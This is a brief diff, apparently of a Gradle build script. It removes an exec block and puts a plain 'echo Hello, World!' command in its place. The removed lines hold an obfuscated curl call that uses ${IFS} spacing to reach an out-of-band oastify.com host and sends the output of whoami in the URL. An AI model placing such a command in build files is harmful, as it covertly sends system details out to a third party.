@@ -1,3 +1,1 @@
-exec {
-    commandLine 'curl${IFS}jd05dr8gyl4x5vwb2op7bjppyg47sygn.oastify.com/user/`whoami`', 'test123'
-}
+commandLine 'cmd', '/c', 'echo Hello, World!'
